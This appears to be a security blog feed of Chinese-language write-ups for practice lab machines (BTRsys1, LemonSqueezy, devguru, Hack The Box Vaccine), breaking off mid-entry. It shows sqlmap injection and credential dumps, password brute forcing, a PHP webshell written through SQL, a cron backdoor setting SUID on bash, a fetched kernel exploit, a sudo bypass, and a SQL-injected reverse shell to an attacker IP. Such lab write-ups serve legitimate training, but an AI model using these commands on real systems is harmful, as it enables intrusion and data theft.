        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—BTRsys1"><a href="#OSCP系列靶机—BTRsys1" class="headerlink" title="OSCP系列靶机—BTRsys1"></a>OSCP系列靶机—BTRsys1</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-BTRsys1/image-20240722153014361.png" alt="image-20240722153014361"></p><h2 id="二、端口探测"><a href="#二、端口探测" class="headerlink" title="二、端口探测"></a>二、端口探测</h2><p>1、快速扫描</p><p><img src="/img/OSCP-BTRsys1/image-20240722153056004.png" alt="image-20240722153056004"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-BTRsys1/image-20240722153129282.png" alt="image-20240722153129282"></p><p>共开放三个端口</p><p>3、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 21,22,80 192.168.31.72</span><br></pre></td></tr></table></figure><p>上面给出了端口对应的服务信息，就不再进行服务版本探测了</p><p><img src="/img/OSCP-BTRsys1/image-20240722153235844.png" alt="image-20240722153235844"></p><p>ftp 存在任意用户登陆，其他端口没啥信息</p><p><img src="/img/OSCP-BTRsys1/image-20240722153311271.png" alt="image-20240722153311271"></p><h2 id="三、FTP信息收集"><a href="#三、FTP信息收集" class="headerlink" title="三、FTP信息收集"></a>三、FTP信息收集</h2><p><img src="/img/OSCP-BTRsys1/image-20240722153520227.png" alt="image-20240722153520227"></p><p>啥也没有，不应该啊；尝试文件上传</p><p><img src="/img/OSCP-BTRsys1/image-20240722153652206.png" alt="image-20240722153652206"></p><p>权限被拒绝，无法上传</p><h2 id="四、HTTP信息收集"><a href="#四、HTTP信息收集" class="headerlink" title="四、HTTP信息收集"></a>四、HTTP信息收集</h2><h3 id="1、首页及源代码"><a href="#1、首页及源代码" class="headerlink" title="1、首页及源代码"></a>1、首页及源代码</h3><p><img src="/img/OSCP-BTRsys1/image-20240722153815998.png" alt="image-20240722153815998"></p><p>他这里还一直在转圈圈，加载慢了很，估计是后端有一直在执行的操作；看源代码</p><p><img src="/img/OSCP-BTRsys1/image-20240722154006002.png" alt="image-20240722154006002"></p><p>噢，我说怎么加载这么慢，原来是css、js等请求了外部链接；纵观这个源代码，只有a标签的<code>hakkimizda.php</code>链接是我们感兴趣的</p><h3 id="2、hakkimizda-php-文件"><a href="#2、hakkimizda-php-文件" class="headerlink" title="2、hakkimizda.php 文件"></a>2、hakkimizda.php 文件</h3><p><img src="/img/OSCP-BTRsys1/image-20240722154331817.png" alt="image-20240722154331817"></p><p>这里疑似有文件包含的嫌疑，它的头部跟首页是一样的；把这段话拿给AI解析下</p><p><img src="/img/OSCP-BTRsys1/image-20240722154607262.png" alt="image-20240722154607262"></p><p>是一段土耳其语言说的一段话，后面的渗透测试步骤这里似乎给了提示，不知道是否与此靶场有关</p><p><img src="/img/OSCP-BTRsys1/image-20240722154735567.png" alt="image-20240722154735567"></p><h3 id="3、做目录扫描"><a href="#3、做目录扫描" class="headerlink" title="3、做目录扫描"></a>3、做目录扫描</h3><p>到这里基本上没线索了，做一遍目录扫描</p><p><img src="/img/OSCP-BTRsys1/image-20240722155256963.png" alt="image-20240722155256963"></p><p>倒是发现几个有趣的文件和文件夹；挑有价值的讲一下</p><h3 id="4、login-php-文件"><a href="#4、login-php-文件" class="headerlink" title="4、login.php 文件"></a>4、login.php 文件</h3><p><img src="/img/OSCP-BTRsys1/image-20240722155731439.png" alt="image-20240722155731439"></p><p>本想尝试下弱口令，但是发现这个地方没有走后端；校验是在前端中</p><p><img src="/img/OSCP-BTRsys1/image-20240722160028558.png" alt="image-20240722160028558"></p><p>看源代码；原来是在前端先校验了下用户名中<code>@</code>后面是不是<code>btrisk.com</code>，符合要求才向后端提交</p><p><img src="/img/OSCP-BTRsys1/image-20240722160157681.png" alt="image-20240722160157681"></p><p>我们随便用一个账号如 <code>123@btrisk.com</code> 任意密码，来到了后端的<code>personel.php</code>文件</p><p><img src="/img/OSCP-BTRsys1/image-20240722160643305.png" alt="image-20240722160643305"></p><p>这里有个报错，说缺少参数；下面没有显示具体的字段信息；应该是用户名符合要求所以进来这个页面，但是因为密码不正确所以没有添加上必要的参数；既然如此，用sqlmap 跑一下看是否存在sql注入漏洞</p><h3 id="5、SQL注入漏洞"><a href="#5、SQL注入漏洞" class="headerlink" title="5、SQL注入漏洞"></a>5、SQL注入漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.31.72/personel.php --data &quot;kullanici_adi=admin@btrisk.com&amp;parola=123456&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722161550783.png" alt="image-20240722161550783"></p><p>OK，结果也是非常明显，存在SQL注入，那查看用户的信息</p><p>当我们查到字段的时候，发现有这么些字段，看哪个字段呢？</p><p><img src="/img/OSCP-BTRsys1/image-20240722161752570.png" alt="image-20240722161752570"></p><p>在登录框中已经给出了答案</p><p><img src="/img/OSCP-BTRsys1/image-20240722161726319.png" alt="image-20240722161726319"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.31.72/personel.php --data &quot;kullanici_adi=admin@btrisk.com&amp;parola=123456&quot; --batch -D &quot;deneme&quot; -T &quot;user&quot; -C &quot;Kullanici_Adi,Parola&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722161902674.png" alt="image-20240722161902674"></p><p>俩用户，密码都一样的昂</p><h3 id="6、登陆后台"><a href="#6、登陆后台" class="headerlink" title="6、登陆后台"></a>6、登陆后台</h3><p>登陆之后，后台果然变了，有文件上传</p><p><img src="/img/OSCP-BTRsys1/image-20240722162028206.png" alt="image-20240722162028206"></p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>本想上传一个txt文件试试水，但给我拦截了，说只能<code>jpg,png</code>格式</p><p><img src="/img/OSCP-BTRsys1/image-20240722162204112.png" alt="image-20240722162204112"></p><p>我把txt 后缀改成jpg，继续上传</p><p><img src="/img/OSCP-BTRsys1/image-20240722162332979.png" alt="image-20240722162332979"></p><p>上传成功，但是没给路径；欸，这个时候想起来做目录扫描中发现的<code>/uploads/</code>目录了，去看下</p><p><img src="/img/OSCP-BTRsys1/image-20240722162420803.png" alt="image-20240722162420803"></p><p>果然在这里；那上传php 反弹shell 文件；注意改成自己的IP和端口</p><p><img src="/img/OSCP-BTRsys1/image-20240722162536677.png" alt="image-20240722162536677"></p><p>上传用bp 抓包改后缀</p><p><img src="/img/OSCP-BTRsys1/image-20240722162724345.png" alt="image-20240722162724345"></p><p>访问webshell，并用nc 进行监听，成功getshell</p><p><img src="/img/OSCP-BTRsys1/image-20240722162851050.png" alt="image-20240722162851050"></p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-BTRsys1/image-20240722163226329.png" alt="image-20240722163226329"></p><p>发现数据库的账号码，而且还是root 高权限用户</p><p><img src="/img/OSCP-BTRsys1/image-20240722163957837.png" alt="image-20240722163957837"></p><p>但是运行mysql 的用户是<code>mysql</code>，依然是低权限用户，无法通过数据库进行提权；但是看到这个linux 的内核版本较低，是否可以使用脏牛提权呢？</p><h3 id="2、脏牛提权至root"><a href="#2、脏牛提权至root" class="headerlink" title="2、脏牛提权至root"></a>2、脏牛提权至root</h3><p>查询有关该内核版本提权的脚本</p><p><img src="/img/OSCP-BTRsys1/image-20240722164254080.png" alt="image-20240722164254080"></p><p>有俩，感觉能成功，尝试第一个</p><p><img src="/img/OSCP-BTRsys1/image-20240722164507055.png" alt="image-20240722164507055"></p><p>脚本上写了食用方法，照着来就行，将脚本上传至靶机后编译运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 攻击机</span><br><span class="line">python3 -m http.server</span><br><span class="line">// 靶机</span><br><span class="line">cd /tmp;wget http://192.168.31.58:8000/37292.c</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722165100748.png" alt="image-20240722165100748"></p><p>欸，没有gcc 文件，那用cc ；把这里的gcc 改成 cc；之后重新来一遍</p><p><img src="/img/OSCP-BTRsys1/image-20240722172104166.png" alt="image-20240722172104166"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//cc执行</span><br><span class="line">cc 37292.c -o ofs</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys1/image-20240722172408177.png" alt="image-20240722172408177"></p><p>提权成功</p><p><img src="/img/OSCP-BTRsys1/image-20240722172430686.png" alt="image-20240722172430686"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-LemonSqueezy</title>
      <link href="/2024/07/22/OSCP-LemonSqueezy/"/>
      <url>/2024/07/22/OSCP-LemonSqueezy/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机-LemonSqueezy"><a href="#【OSCP系列】OSCP靶机-LemonSqueezy" class="headerlink" title="【OSCP系列】OSCP靶机-LemonSqueezy"></a>【OSCP系列】OSCP靶机-LemonSqueezy</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-LemonSqueezy/image-20240721193710744.png" alt="image-20240721193710744"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721193803205.png" alt="image-20240721193803205"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721193853109.png" alt="image-20240721193853109"></p><p>只有一个80端口</p><p>3、版本系统探测</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194004016.png" alt="image-20240721194004016"></p><p>80端口http的apache服务，系统疑似linux 3或linux 4版本，可能存在脏牛提取漏洞</p><p>4、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 80 192.168.31.71</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721194310067.png" alt="image-20240721194310067"></p><p>找到一些可能的csrf 漏洞</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194334838.png" alt="image-20240721194334838"></p><p>还做了一些目录扫描，这里有很多感兴趣的目录</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>对根目录先做一个扫描</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194909005.png" alt="image-20240721194909005"></p><h3 id="1、wordpress信息收集"><a href="#1、wordpress信息收集" class="headerlink" title="1、wordpress信息收集"></a>1、wordpress信息收集</h3><p>1、wpscan 工具找用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ --enumerate u</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721195901728.png" alt="image-20240721195901728"></p><p>2、用 <code>cewl</code>生成密码</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721200047471.png" alt="image-20240721200047471"></p><p>3、尝试wpscan 爆破密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P pass.txt --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721200324539.png" alt="image-20240721200324539"></p><p>爆破失败；尝试使用大字典进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P /usr/share/wordlists/rockyou.txt --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721212623527.png" alt="image-20240721212623527"></p><p>这里一直在跑，需要等待了</p><p>4、源码查看</p><p>目录扫描中，有一个tar.gz 文件，下载并解压</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721201601529.png" alt="image-20240721201601529"></p><p>没有<code>wp-config.php</code>文件，但是有个<code>wp-config-sample.php</code>文件，本想着能找到账号密码，但是结果是这样的</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721212437529.png" alt="image-20240721212437529"></p><p>5、登陆wordpress 后台</p><p>我们对用户名进行分开爆破，第二个用户很快爆破出来密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P /usr/share/wordlists/rockyou.txt --usernames &quot;orange&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721213301924.png" alt="image-20240721213301924"></p><p>进入后台，有一篇<code>orange</code>本人发表的文章；且名字可疑</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213659327.png" alt="image-20240721213659327"></p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213723346.png" alt="image-20240721213723346"></p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213749683.png" alt="image-20240721213749683"></p><p>噢，保持这个安全，这个怕是某个密码</p><p>本来还想ssh 尝试爆破，但是突然想到这个靶场只有80端口</p><h3 id="2、phpmyadmin信息收集"><a href="#2、phpmyadmin信息收集" class="headerlink" title="2、phpmyadmin信息收集"></a>2、phpmyadmin信息收集</h3><p>利用上面的账号密码在phpmyadmin进行登陆，登陆成功</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721214432676.png" alt="image-20240721214432676"></p><p>尝试日志getshell</p><p>但是想到不是root用户，似乎没有权限</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721214748196.png" alt="image-20240721214748196"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>尝试在phpmyadmin后台写入webshell文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php system($_GET[&#x27;shell&#x27;]); ?&gt;&quot; into outfile &quot;/var/www/html/wordpress/shell.php&quot; </span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721214852097.png" alt="image-20240721214852097"></p><p>执行成功；尝试执行命令；执行成功</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721215036637.png" alt="image-20240721215036637"></p><p>反弹shell</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220243106.png" alt="image-20240721220243106"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>1、信息收集</p><p>进来之后看到了备份文件中没有的<code>wp-config.php</code>文件</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220413052.png" alt="image-20240721220413052"></p><p>重新看到了数据库的账号密码</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220543049.png" alt="image-20240721220543049"></p><p>2、计划任务</p><p>查看计划任务发现最后有一个可疑的点</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721221511558.png" alt="image-20240721221511558"></p><p>居然是一个777 的可写可执行文件</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721221623748.png" alt="image-20240721221623748"></p><p>写入一个后门，如<code>/bin/bash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;chmod +s /bin/bash&#x27; &gt; /etc/logrotate.d/logrotate</span><br></pre></td></tr></table></figure><p>之后等待<code>/bin/bash</code>变成suid 文件</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721223650413.png" alt="image-20240721223650413"></p><p>3、提权至root</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721223739692.png" alt="image-20240721223739692"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—devguru</title>
      <link href="/2024/07/20/OSCP-devguru/"/>
      <url>/2024/07/20/OSCP-devguru/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—devguru"><a href="#【OSCP系列】OSCP靶机—devguru" class="headerlink" title="【OSCP系列】OSCP靶机—devguru"></a>【OSCP系列】OSCP靶机—devguru</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-devguru/image-20240718222512239.png" alt="image-20240718222512239"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-devguru/image-20240718222557792.png" alt="image-20240718222557792"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-devguru/image-20240718222625989.png" alt="image-20240718222625989"></p><p>3、服务版本探测</p><p><img src="/img/OSCP-devguru/image-20240718222853251.png" alt="image-20240718222853251"></p><p>4、漏洞探测</p><p><img src="/img/OSCP-devguru/image-20240718223139900.png" alt="image-20240718223139900"></p><p>发现git泄露，还有些许目录扫描</p><p><img src="/img/OSCP-devguru/image-20240718223204843.png" alt="image-20240718223204843"></p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>1、首页</p><p><img src="/img/OSCP-devguru/image-20240718223301889.png" alt="image-20240718223301889"></p><p>2、进行目录扫描</p><p><img src="/img/OSCP-devguru/image-20240718223545789.png" alt="image-20240718223545789"></p><p>3、git信息收集</p><p><img src="/img/OSCP-devguru/image-20240718223713078.png" alt="image-20240718223713078"></p><p>看来是网站的源代码</p><p><img src="/img/OSCP-devguru/image-20240718223759453.png" alt="image-20240718223759453"></p><p>查找敏感文件</p><p><img src="/img/OSCP-devguru/image-20240718224102475.png" alt="image-20240718224102475"></p><p>这里记录了数据库的账号密码</p><p><img src="/img/OSCP-devguru/image-20240718224144444.png" alt="image-20240718224144444"></p><p>4、Adminer登陆</p><p><img src="/img/OSCP-devguru/image-20240718224931376.png" alt="image-20240718224931376"></p><p>看数据库的用户信息</p><p><img src="/img/OSCP-devguru/image-20240718225450025.png" alt="image-20240718225450025"></p><p>用john 对这个密码进行破解</p><p><img src="/img/OSCP-devguru/image-20240718231547556.png" alt="image-20240718231547556"></p><p>爆破时间太长了，感觉没结果，不过看到是bcrypt 加密方法，是否可以更新密码呢</p><p>5、登陆后台</p><p>对用户的密码进行更改</p><p><img src="/img/OSCP-devguru/image-20240718231900908.png" alt="image-20240718231900908"></p><p>更改密码</p><p><img src="/img/OSCP-devguru/image-20240718232004534.png" alt="image-20240718232004534"></p><p>找到后台进行登陆</p><p><img src="/img/OSCP-devguru/image-20240718232043073.png" alt="image-20240718232043073"></p><p>进入后台</p><p><img src="/img/OSCP-devguru/image-20240718232127776.png" alt="image-20240718232127776"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>1、查找信息</p><p><img src="/img/OSCP-devguru/image-20240718232855445.png" alt="image-20240718232855445"></p><p>这个地方看来可以执行代码，但是不知道用那种语言；看其他的地方，这里有个模板可用</p><p><img src="/img/OSCP-devguru/image-20240718232830942.png" alt="image-20240718232830942"></p><p>使用，写入webshell，上面进行保存</p><p><img src="/img/OSCP-devguru/image-20240718233315302.png" alt="image-20240718233315302"></p><p>尝试执行命令；执行成功</p><p><img src="/img/OSCP-devguru/image-20240718233410162.png" alt="image-20240718233410162"></p><p>进行shell反弹</p><p><img src="/img/OSCP-devguru/image-20240719004234288.png" alt="image-20240719004234288"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权至frank"><a href="#1、提权至frank" class="headerlink" title="1、提权至frank"></a>1、提权至frank</h3><p>1、翻找敏感文件</p><p><img src="/img/OSCP-devguru/image-20240719005210553.png" alt="image-20240719005210553"></p><p>似乎是什么备份文件</p><p>2、将这几个文件下载下来</p><p>这个<code>app.ini.bak</code>文件好像是某个配置文件，价值可能更大</p><p><img src="/img/OSCP-devguru/image-20240720133233489.png" alt="image-20240720133233489"></p><p>3、查看内容</p><p><img src="/img/OSCP-devguru/image-20240720133314456.png" alt="image-20240720133314456"></p><p>通过浏览，确实是配置文件，进行筛选，看有无密码信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.ini.bak | grep -C 10 pass</span><br></pre></td></tr></table></figure><p>我们通过grep 命令，筛选 有关 pass 的条数，并上下浮动10行；可以看到这里有mysql 数据库的其他账号密码</p><p><img src="/img/OSCP-devguru/image-20240720134122583.png" alt="image-20240720134122583"></p><p>以及疑似有redis 数据库的存在</p><p><img src="/img/OSCP-devguru/image-20240720134239196.png" alt="image-20240720134239196"></p><p>去靶机中看下是否有redis 的进程</p><p><img src="/img/OSCP-devguru/image-20240720134407879.png" alt="image-20240720134407879"></p><p>没有；不过我们拿到了mysql 数据库的其他账号信息</p><p>4、重新登陆MySQL</p><p>注意，下面这个才是用户的密码</p><p><img src="/img/OSCP-devguru/image-20240720134747779.png" alt="image-20240720134747779"></p><p>登陆进来</p><p><img src="/img/OSCP-devguru/image-20240720134803091.png" alt="image-20240720134803091"></p><p>在<code>user</code>表中看到<code>frank</code>用户的信息</p><p><img src="/img/OSCP-devguru/image-20240720134938730.png" alt="image-20240720134938730"></p><p>不过这个密码奇怪的很，不知道是哪种加密方法；后面的<code>passwd_hash_algo</code>给出了加密方式<code>pbkdf2</code></p><p><img src="/img/OSCP-devguru/image-20240720135645239.png" alt="image-20240720135645239"></p><p>本来还想尝试用<code>pbkdf2</code>的加密方式对密码进行修改的，结果一看，这个加密方式不仅需要有盐，还需要key，麻烦了很</p><p><img src="/img/OSCP-devguru/image-20240720140346345.png" alt="image-20240720140346345"></p><p>在<code>app.ini.bak</code>中提到过密码的加密方式，有我们用过的<code>bcrypt</code>加密方法 </p><p><img src="/img/OSCP-devguru/image-20240720140444298.png" alt="image-20240720140444298"></p><p>我们直接把数据库的加密方法一同改掉</p><p><img src="/img/OSCP-devguru/image-20240720140721959.png" alt="image-20240720140721959"></p><p>5、登陆后台</p><p>这里的后台在8585端口上，是一个Gitea 的私人仓库</p><p><img src="/img/OSCP-devguru/image-20240720141148502.png" alt="image-20240720141148502"></p><p>直接登陆</p><p><img src="/img/OSCP-devguru/image-20240720141207760.png" alt="image-20240720141207760"></p><p>成功登陆后台</p><p><img src="/img/OSCP-devguru/image-20240720141228082.png" alt="image-20240720141228082"></p><p>6、提权至frank</p><p><img src="/img/OSCP-devguru/image-20240720141511405.png" alt="image-20240720141511405"></p><p>这里显示了当前Gitea 的版本号；查找有无该版本的漏洞</p><p><img src="/img/OSCP-devguru/image-20240720141623044.png" alt="image-20240720141623044"></p><p>复制过来利用</p><p><img src="/img/OSCP-devguru/image-20240720141836369.png" alt="image-20240720141836369"></p><p>把他的参数凑齐</p><p><img src="/img/OSCP-devguru/image-20240720142234919.png" alt="image-20240720142234919"></p><p>昂。。。利用失败；简单的看一下这个py 文件，这里的payload好像是写入了某个文件中</p><p><img src="/img/OSCP-devguru/image-20240720154234575.png" alt="image-20240720154234575"></p><p>我们再执行一下（稍多等待一会儿），成功拿到了shell</p><p><img src="/img/OSCP-devguru/image-20240720154426252.png" alt="image-20240720154426252"></p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p>看下<code>sudo -l</code></p><p><img src="/img/OSCP-devguru/image-20240720154757070.png" alt="image-20240720154757070"></p><p>这里<code>（ALL, !root）</code> 表示所有用户组的 非root用户 可以使用，也就是说，我们不能以root 身份去执行这个东西；尝试一下先</p><p><img src="/img/OSCP-devguru/image-20240720155322195.png" alt="image-20240720155322195"></p><p>当我们想用root 身份运行这个东西是需要密码（这里需要先进入交互式shell）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;;</span><br></pre></td></tr></table></figure><p>这里陷入了僵局，看了下佬的文章说，这里的sudo 是存在漏洞的；具体的解释在 <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version">Linux Privilege Escalation | HackTricks</a></p><p><img src="/img/OSCP-devguru/image-20240720161027048.png" alt="image-20240720161027048"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-devguru/image-20240720161158437.png" alt="image-20240720161158437"></p><p>存在可能利用风险；我们改变sudo 的利用姿势</p><p><img src="/img/OSCP-devguru/image-20240720161301814.png" alt="image-20240720161301814"></p><p>成功提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Hack The Box系列】Vaccine</title>
      <link href="/2024/07/16/Hackthebox-Vaccine/"/>
      <url>/2024/07/16/Hackthebox-Vaccine/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box系列—Vaccine"><a href="#Hack-The-Box系列—Vaccine" class="headerlink" title="Hack The Box系列—Vaccine"></a>Hack The Box系列—Vaccine</h1><p><img src="/img/Hackthebox-Vaccine/image-20240716150020117.png" alt="image-20240716150020117"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>1、快速端口扫描</p><p><img src="/img/Hackthebox-Vaccine/image-20240716150214399.png" alt="image-20240716150214399"></p><p>2、全端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- --min-rate 10000 10.129.235.167</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Vaccine/image-20240716150556995.png" alt="image-20240716150556995"></p><p>这里没有扫描到80端口，可能是扫描速率太快导致</p><h2 id="二、FTP信息收集"><a href="#二、FTP信息收集" class="headerlink" title="二、FTP信息收集"></a>二、FTP信息收集</h2><p>使用ftp 账号空密码登陆成功</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152229763.png" alt="image-20240716152229763"></p><p>发现一个备份的zip 文件，下载查看</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152311187.png" alt="image-20240716152311187"></p><p>尝试解压</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152409356.png" alt="image-20240716152409356"></p><p>需要密码；转换hash 进行爆破</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152527566.png" alt="image-20240716152527566"></p><p>指定密码解压</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152737621.png" alt="image-20240716152737621"></p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>1、首页</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152805070.png" alt="image-20240716152805070"></p><p>2、是一个登陆页；看从ftp 那里拿到的index.php，应该是这个页面的源码</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152843397.png" alt="image-20240716152843397"></p><p>3、登陆后台</p><p><img src="/img/Hackthebox-Vaccine/image-20240716153005727.png" alt="image-20240716153005727"></p><p><img src="/img/Hackthebox-Vaccine/image-20240716153028838.png" alt="image-20240716153028838"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><h3 id="1、SQL注入"><a href="#1、SQL注入" class="headerlink" title="1、SQL注入"></a>1、SQL注入</h3><p>后台这里疑似存在sql注入漏洞</p><p><img src="/img/Hackthebox-Vaccine/image-20240716153430087.png" alt="image-20240716153430087"></p><p>用sqlmap 跑一下</p><p><img src="/img/Hackthebox-Vaccine/image-20240716173446559.png" alt="image-20240716173446559"></p><p>尝试 <code>--os-shell</code> 获取权限</p><p><img src="/img/Hackthebox-Vaccine/image-20240716181500045.png" alt="image-20240716181500045"></p><p>提示我出错，获取不了</p><h3 id="2、getshell"><a href="#2、getshell" class="headerlink" title="2、getshell"></a>2、getshell</h3><p>使用另一种方法，PostgreSQL version 11.5有COPY命令可以利用，尝试在sql 漏洞处写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; CREATE TABLE cmd_exec(cmd_output text); --</span><br><span class="line">&#x27;; COPY cmd_exec FROM PROGRAM &#x27;bash -c &quot;bash -i 0&gt; /dev/tcp/10.10.16.76/4444&quot;&#x27;; 